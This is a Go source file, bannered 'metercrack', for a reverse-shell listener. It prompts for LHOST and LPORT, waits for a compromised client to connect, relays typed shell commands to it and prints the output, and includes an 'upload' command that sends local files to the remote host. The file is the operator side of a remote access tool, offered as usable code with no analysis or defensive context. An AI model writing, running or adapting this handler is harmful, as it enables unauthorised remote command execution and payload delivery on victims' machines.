package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"io/ioutil"
)

func main() {
	// Banner
	fmt.Println(`
  _ __ ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __
 | '_  _ \ / _ \ __/ _ \ '__/ __| '__/ _ |/ __| |/ /
 | | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   <
 |_| |_| |_|\___|\__\___|_|  \___|_|  \__,_|\___|_\_\
	`)

	// Get LHOST and LPORT input from user
	fmt.Print("ENTER LHOST: ")
	var lhost string
	fmt.Scanln(&lhost)

	fmt.Print("ENTER LPORT: ")
	var lport string
	fmt.Scanln(&lport)

	listenAddr := lhost + ":" + lport

	// Listen for incoming connections
	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		fmt.Println("Error starting listener:", err)
		return
	}
	defer ln.Close()

	fmt.Printf("Listening on %s...\n", listenAddr)

	// Accept client connection
	conn, err := ln.Accept()
	if err != nil {
		fmt.Println("Error accepting connection:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Client connected!")

	// Handle communication with the client
	for {
		// Send Shell prompt to client
		fmt.Print("Shell> ")

		// Read input from server's shell prompt
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		cmd := scanner.Text()

		// Handle the upload command
		if strings.HasPrefix(cmd, "upload ") {
			fileName := strings.TrimPrefix(cmd, "upload ")
			// Try to open the file
			fileContent, err := ioutil.ReadFile(fileName)
			if err != nil {
				fmt.Println("Error reading file:", err)
				continue
			}
			// Send the file content to the client
			conn.Write([]byte("upload " + fileName + "\n"))
			conn.Write(fileContent)
			conn.Write([]byte("\n")) // Add a newline to mark the end of the file
			fmt.Println("File uploaded successfully")
		} else {
			// Send other commands as normal
			_, err := conn.Write([]byte(cmd + "\n"))
			if err != nil {
				fmt.Println("Error sending command:", err)
				return
			}

			// Read response from client
			response, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				fmt.Println("Error reading from client:", err)
				return
			}

			// Display the response from the client
			fmt.Print(response)
		}
	}
}
